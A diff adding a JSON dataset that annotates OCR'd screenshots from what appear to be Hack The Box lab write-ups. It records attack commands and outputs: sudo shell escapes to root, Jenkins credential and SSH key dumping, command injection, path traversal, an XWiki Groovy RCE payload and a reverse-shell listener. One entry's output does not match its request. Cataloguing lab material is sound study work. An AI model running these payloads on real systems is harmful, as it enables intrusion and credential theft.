@@ -1,0 +1,663 @@
+[
+  {
+    "source": {
+      "url": "assets/absolute/image-20230522132556877-61321167451d.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "36ac87c5ec293c721b7cb94580fdc3b6082e422b41f540410c43d389216de71b",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "crackmapexec smb 10.10.11.181 -u usernames-short -p ''",
+        "tool": "netexec",
+        "raw_output": "SMB 10.10.11.181 445 DC [-] corp.htb\\m.lovegood: STATUS_ACCOUNT_RESTRICTION",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "smb.reachable"
+      },
+      {
+        "kind": "blocker.account_restricted"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "blocker.account_restricted",
+        "error": "STATUS_ACCOUNT_RESTRICTION"
+      }
+    ],
+    "flow": [
+      "username-anarchy user list generation",
+      "SMB null-password user validation"
+    ],
+    "notes": "Standalone terminal capture showing username-anarchy + crackmapexec SMB user validation distinguishing STATUS_ACCOUNT_RESTRICTION from STATUS_LOGON_FAILURE."
+  },
+  {
+    "source": {
+      "url": "assets/acute/image-20220607140713237-b0d38e619a05.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "dc4a27ec9efd30e37663a36f291cfda856e578e612e43fdf425ec86e5d8b947d",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "Enter-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred",
+        "tool": "powershell",
+        "raw_output": "$passwd = ConvertTo-SecureString \"<redacted>\" -AsPlainText -Force",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "credential.candidate"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "blocker.access_denied",
+        "error": "Access to the path ConsoleHost_history.txt is denied"
+      }
+    ],
+    "flow": [
+      "Meterpreter screenshare",
+      "ConvertTo-SecureString credential capture",
+      "Constrained endpoint Enter-PSSession"
+    ],
+    "notes": "Remote desktop screenshare showing victim PowerShell session constructing a SecureString credential and hitting JEA/constrained session cmdlet restrictions."
+  },
+  {
+    "source": {
+      "url": "assets/traverxec/image-20191122145157286-c6183fcd131e.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "3b65d366214eee620eee3f2818371fc3c230a20a735e30a84e8f3548f80db35b",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service",
+        "tool": "sudo",
+        "raw_output": "lines 1-3/3 (END) !/bin/bash",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "privesc.sudo_binary"
+      },
+      {
+        "kind": "access.admin"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "journalctl narrow terminal window",
+      "less pager spawn",
+      "!/bin/bash root escape"
+    ],
+    "notes": "Terminal screenshot showing journalctl invoking less pager in a small terminal window and escaping to root via !/bin/bash."
+  },
+  {
+    "source": {
+      "url": "assets/openadmin/image-20200118160219856-a10da76ae0df.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "693c446a60e0fce64cb577bfaabcd693afb5d2245fd64538dadb3310bae05772",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "sudo nano /opt/priv",
+        "tool": "sudo",
+        "raw_output": "Command to execute: reset; /bin/sh 1>&0 2>&0\n# id\nuid=0(root) gid=0(root) groups=0(root)",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "privesc.sudo_binary"
+      },
+      {
+        "kind": "access.admin"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "syntax_error",
+        "error": "bash: -c: line 0: syntax error near unexpected token ')'"
+      }
+    ],
+    "flow": [
+      "sudo nano /opt/priv",
+      "^R ^X command execution",
+      "uid=0(root)"
+    ],
+    "notes": "TUI nano screenshot showing GTFOBins ^R ^X shell escape and an initial typo failure before landing uid=0(root)."
+  },
+  {
+    "source": {
+      "url": "assets/meta/image-20220603173927759-45cf8fbcfb0d.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "bd9034587230e58d0a236e667e94eaaf7719c4f63ada84dfdefcca9d84254fb1",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "neofetch",
+        "tool": "neofetch",
+        "raw_output": "OS: Debian GNU/Linux 10 (buster) x86_64\nKernel: 4.19.0-17-amd64",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "host.os_family"
+      },
+      {
+        "kind": "host.kernel"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "neofetch system enumeration"
+    ],
+    "notes": "Terminal screenshot of neofetch output disclosing Debian 10 OS family and Linux 4.19.0-17-amd64 kernel."
+  },
+  {
+    "source": {
+      "url": "assets/builder/image-20240211171424021-1c2d85bf4d04.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "6ba1b5e7a3934879d11ab98794dd0a8644a1eb48d1e85716139bcabf694952da",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "println(hudson.util.Secret.decrypt(\"{AQAAABAAAA...}\"))",
+        "tool": "jenkins-script-console",
+        "raw_output": "-----BEGIN OPENSSH PRIVATE KEY-----\n<redacted>\n-----END OPENSSH PRIVATE KEY-----",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "credential.certificate"
+      },
+      {
+        "kind": "web.source"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Jenkins Script Console",
+      "hudson.util.Secret.decrypt",
+      "SSH private key recovery"
+    ],
+    "notes": "Jenkins Script Console screenshot running Groovy hudson.util.Secret.decrypt to recover an OpenSSH private key; code is only in the screenshot."
+  },
+  {
+    "source": {
+      "url": "assets/builder/image-20240212083527889-a73416da47db.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "129946c0daaf0b3ff0761994588a62b5e266cd5747f81aa47d926fbe2d07b3c8",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "ssh -o StrictHostKeyChecking=no -l root 10.10.11.10 find /root",
+        "tool": "ssh",
+        "raw_output": "+ ssh -o StrictHostKeyChecking=no -l root 10.10.11.10 find /root\n/root\n/root/.ssh/id_rsa\n/root/root.txt",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "loot.files"
+      },
+      {
+        "kind": "objective.flag_located_root"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Jenkins Pipeline SSH step",
+      "root filesystem listing"
+    ],
+    "notes": "Jenkins Pipeline console output showing SSH execution as root and locating /root/.ssh/id_rsa and /root/root.txt."
+  },
+  {
+    "source": {
+      "url": "assets/builder/image-20240212120330195-c5b23d85d899.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "8f44d260fa39ff4d2690c433c97ba13c02555c03f542c09f378d8bd2b7bed4bd",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "node { withCredentials([sshUserPrivateKey(credentialsId: \"1\", keyFileVariable: \"keyFile\")]) { sh \"cat ${keyFile}\" } }",
+        "tool": "jenkins-pipeline",
+        "raw_output": "-----BEGIN OPENSSH PRIVATE KEY-----",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "credential.certificate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Jenkins Pipeline withCredentials step",
+      "SSH key file read"
+    ],
+    "notes": "Jenkins Pipeline configuration screenshot showing the untranscribed Groovy withCredentials pipeline script that dumps the stored SSH key."
+  },
+  {
+    "source": {
+      "url": "assets/hathor/image-20221109092913967-7e3790f54407.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "d9e31d6fc7902f4fe8d81f3e043d1cb550452aff63f43d7d78e021c67293034e",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "cmd.exe /c powershell -c $ExecutionContext.SessionState.LanguageMode",
+        "tool": "powershell",
+        "raw_output": "ConstrainedLanguage",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "defense.control"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "ASPX webshell command execution",
+      "PowerShell LanguageMode check"
+    ],
+    "notes": "ASPX webshell screenshot running $ExecutionContext.SessionState.LanguageMode and confirming ConstrainedLanguage mode."
+  },
+  {
+    "source": {
+      "url": "assets/hathor/image-20221109123606820-b0521ddc67bd.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "751effb0d139dd1cbcf9ca0c1ba6193fe3f62aae080d43084548da91d63aad02",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "powershell.exe Get-AppLockerPolicy -Effective -Xml",
+        "tool": "powershell",
+        "raw_output": "<AppLockerPolicy Version=\"1\"><RuleCollection Type=\"Appx\" EnforcementMode=\"Enabled\">",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "defense.control"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "ASPX webshell command execution",
+      "Get-AppLockerPolicy XML dump"
+    ],
+    "notes": "ASPX webshell screenshot running Get-AppLockerPolicy -Effective -Xml and returning the active AppLocker XML policy."
+  },
+  {
+    "source": {
+      "url": "assets/shibboleth/image-20220331065049219-fc165f8c668e.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "729478d0989096f6c52fd6a8d65bf5b7a318232029608a46e73db3b6aa6798d4",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "system.run[id,Wait]",
+        "tool": "zabbix",
+        "raw_output": "uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "foothold.linux"
+      },
+      {
+        "kind": "access.shell"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Zabbix item test RCE",
+      "uid=110(zabbix)"
+    ],
+    "notes": "Zabbix web console Test Item dialog confirming command execution as uid=110(zabbix)."
+  },
+  {
+    "source": {
+      "url": "assets/cozyhosting/image-20240227103427316-f4b3d7da2b06.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "a7ff31b8c85b33c40f96627aa7524bc75b1f7bb38cc92de3cb6f194c4dfd3b90",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "POST /executessh host=127.0.0.1; ping -c 1 10.10.14.6",
+        "tool": "curl",
+        "raw_output": "The host was not added! Invalid hostname!",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [],
+    "failures": [
+      {
+        "blocker": "whitespace_filter",
+        "error": "Invalid hostname!"
+      }
+    ],
+    "flow": [
+      "SSH hostname command injection probe",
+      "whitespace filter discovery -> ${IFS} bypass"
+    ],
+    "notes": "Web form screenshot showing initial command injection payload rejected due to spaces before switching to ${IFS}."
+  },
+  {
+    "source": {
+      "url": "assets/cozyhosting/image-20240227125049373-81658447a024.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "61c1cc7bbf7cc0518fc8548e06ebcf340c618f028ddf55dcdd9fe20d6ab7e88b",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "jd-gui cloudhosting-0.0.1.jar",
+        "tool": "jd-gui",
+        "raw_output": "spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting\nspring.datasource.username=postgres\nspring.datasource.password=<redacted>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "credential.candidate"
+      },
+      {
+        "kind": "web.source"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "JAR decompilation in jd-gui",
+      "application.properties PostgreSQL credential extraction"
+    ],
+    "notes": "jd-gui decompiler screenshot exposing spring.datasource.username and spring.datasource.password."
+  },
+  {
+    "source": {
+      "url": "assets/control/image-20200423170843330-cac723f4c315.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "f991596573a22e128347f020dff953fccfaca0d11f34d7783d4c8ef7af7d54b8",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "rlwrap nc -lnvp 443",
+        "tool": "nc",
+        "raw_output": "C:\\Windows\\system32> whoami\nnt authority\\system",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "foothold.windows"
+      },
+      {
+        "kind": "access.system"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "blocker.access_denied",
+        "error": "Registry PermissionDenied on RasMan"
+      }
+    ],
+    "flow": [
+      "Windows service ImagePath hijack loop",
+      "SYSTEM reverse shell"
+    ],
+    "notes": "Dual-pane terminal screenshot showing Windows service hijack loop and resulting nt authority\\system shell."
+  },
+  {
+    "source": {
+      "url": "assets/fingerprint/image-20211105154236665-8bcd70507966.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "6bb350b3d4245f76e8679dda9012875fd7e1857047403f80c3de7af9751f4aec",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "curl --path-as-is http://10.10.11.10/admin/view/../../../../../../root/root.txt",
+        "tool": "burp",
+        "raw_output": "HTTP/1.1 200 OK\r\n\r\nroot:x:0:0:root:/root:/bin/bash",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.lfi_confirmed"
+      },
+      {
+        "kind": "http.reachable"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Burp Repeater path traversal without leading slash",
+      "arbitrary file read"
+    ],
+    "notes": "Burp Repeater screenshot showing path traversal payload that is not in any code block in that section."
+  },
+  {
+    "source": {
+      "url": "assets/bastion/1557457064938-90b5271337d2.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "2e31508d2ce10215ac441883c918c1754b5dbc2a92be1bd1b80b0dfb1a2d5bf7",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "mremoteng-decrypt",
+        "tool": "mremoteng",
+        "raw_output": "L4mpje@192.168.1.75:3389 | password is: <redacted>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "credential.plaintext"
+      },
+      {
+        "kind": "credential.available"
+      },
+      {
+        "kind": "credential.candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "mRemoteNG External Tool cmd popup",
+      "cleartext password disclosure"
+    ],
+    "notes": "Legacy timestamped screenshot showing cmd.exe printing mRemoteNG connection username, host, and password."
+  },
+  {
+    "source": {
+      "url": "assets/jeeves/image-20220412192510899-a5d165b4239d.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "c3a69bea3a4c568fa82f27961a82d63515c8b67cdd826897aaf7117129cf62ec",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "cmd /c whoami",
+        "tool": "jenkins",
+        "raw_output": "Building in workspace C:\\Users\\Administrator\\.jenkins\\workspace\\0xdf\n[0xdf] $ cmd /c call C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\jenkins.bat\nC:\\Users\\Administrator\\.jenkins\\workspace\\0xdf>whoami\njeeves\\kohsuke",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "foothold.windows"
+      },
+      {
+        "kind": "host.os_family"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Jenkins build step command execution",
+      "whoami output jeeves\\kohsuke"
+    ],
+    "notes": "Jenkins Console Output screenshot showing build execution as jeeves\\kohsuke inside C:\\Users\\Administrator\\.jenkins."
+  },
+  {
+    "source": {
+      "url": "assets/clicker/image-20240125154252502-32beb4b65438.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "4e3af0737a6fb3094162be25ea2d6c113d9c62331583c40ffb92215b6d69ed2f",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "GET /diagnostic.php?token=secret_diagnostic_token HTTP/1.1",
+        "tool": "burp",
+        "raw_output": "HTTP/1.1 200 OK\r\n\r\n<?xml version=\"1.0\"?><data><timestamp>1706215259</timestamp></data>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "http.reachable"
+      },
+      {
+        "kind": "web.source"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "http_proxy environment variable",
+      "Burp Proxy intercept of /diagnostic.php token"
+    ],
+    "notes": "Burp Proxy capture of internal curl request leaking diagnostic token and XML response."
+  },
+  {
+    "source": {
+      "url": "assets/editor/image-20250809153630900-8172c971b804.png",
+      "retrieved": "2026-10-23"
+    },
+    "asset": {
+      "hash": "e5d0ebda0b2274b530ef057a56c14aa38c76c1e2c3edd30c0dbfc22bb6d34382",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "GET /xwiki/bin/view/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22id%22.execute().text)%7b%7b/groovy%7d%7d%7b%7b/async%7d%7d HTTP/1.1",
+        "tool": "burp",
+        "raw_output": "HTTP/1.1 200 OK\r\n\r\nuid=997(xwiki) gid=997(xwiki) groups=997(xwiki)",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "foothold.linux"
+      },
+      {
+        "kind": "access.shell"
+      },
+      {
+        "kind": "web.ssti_confirmed"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "XWiki SolrSearch Groovy async template injection",
+      "Burp Repeater RCE"
+    ],
+    "notes": "Burp Repeater screenshot showing XWiki Groovy RCE payload and uid=997(xwiki) output (entire exploit step in editor.md has only Burp screenshots, zero code blocks)."
+  }
+]
